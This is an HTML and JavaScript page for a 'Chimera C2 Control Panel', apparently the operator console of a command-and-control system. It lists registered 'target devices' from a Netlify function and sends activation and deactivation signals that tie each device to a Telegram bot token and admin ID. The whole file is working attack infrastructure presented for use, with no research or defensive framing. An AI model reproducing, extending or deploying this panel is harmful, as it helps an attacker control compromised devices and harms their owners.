<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera C2 Control</title>
    <style>
        body { font-family: sans-serif; background: #222; color: #eee; padding: 20px; }
        .container { max-width: 800px; margin: auto; }
        .device { border: 1px solid #444; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
        h1, h2 { color: #00aaff; }
        input, select, button { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 3px; border: 1px solid #555; background: #333; color: #eee; }
        button { cursor: pointer; background: #00aaff; font-weight: bold; }
        button.deactivate { background: #ff4400; }
        #log { margin-top: 20px; padding: 10px; background: #111; border: 1px solid #333; height: 150px; overflow-y: scroll; white-space: pre-wrap; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Chimera C2 Control Panel</h1>
        
        <div class="device">
            <h2>Configuration</h2>
            <input type="text" id="botToken" placeholder="Enter Telegram Bot Token">
            <input type="text" id="adminId" placeholder="Enter Your Telegram Admin ID">
        </div>

        <div class="device">
            <h2>Target Device</h2>
            <select id="deviceList"></select>
            <button onclick="activateDevice()">Activate Device</button>
            <button class="deactivate" onclick="deactivateDevice()">Deactivate Device</button>
        </div>

        <div id="log">Awaiting action...</div>
    </div>

    <script>
        const log = (message) => document.getElementById('log').textContent = message;

        async function fetchDevices() {
            log('Fetching registered devices...');
            try {
                const response = await fetch('/.netlify/functions/get-devices');
                const devices = await response.json();
                const deviceList = document.getElementById('deviceList');
                deviceList.innerHTML = '';
                if (devices.length === 0) {
                    deviceList.innerHTML = '<option>No devices registered yet</option>';
                } else {
                    devices.forEach(device => {
                        const option = document.createElement('option');
                        option.value = device.deviceId;
                        option.textContent = `${device.deviceName} (${device.deviceId.slice(0, 8)}...)`;
                        deviceList.appendChild(option);
                    });
                }
                log('Device list loaded.');
            } catch (error) {
                log('Error fetching devices.');
            }
        }

        async function activateDevice() {
            const deviceId = document.getElementById('deviceList').value;
            const botToken = document.getElementById('botToken').value;
            const adminId = document.getElementById('adminId').value;

            if (!deviceId || !botToken || !adminId) {
                log('Please fill in all fields.');
                return;
            }

            log(`Sending activation signal to ${deviceId}...`);
            const response = await fetch('/.netlify/functions/activate', {
                method: 'POST',
                body: JSON.stringify({ deviceId, botToken, adminId })
            });
            log(await response.text());
        }
        
        async function deactivateDevice() {
            const deviceId = document.getElementById('deviceList').value;
            if (!deviceId) {
                log('Please select a device.');
                return;
            }
            log(`Sending deactivation signal to ${deviceId}...`);
            const response = await fetch('/.netlify/functions/deactivate', {
                method: 'POST',
                body: JSON.stringify({ deviceId })
            });
            log(await response.text());
        }

        window.onload = fetchDevices;
    </script>
</body>
</html>
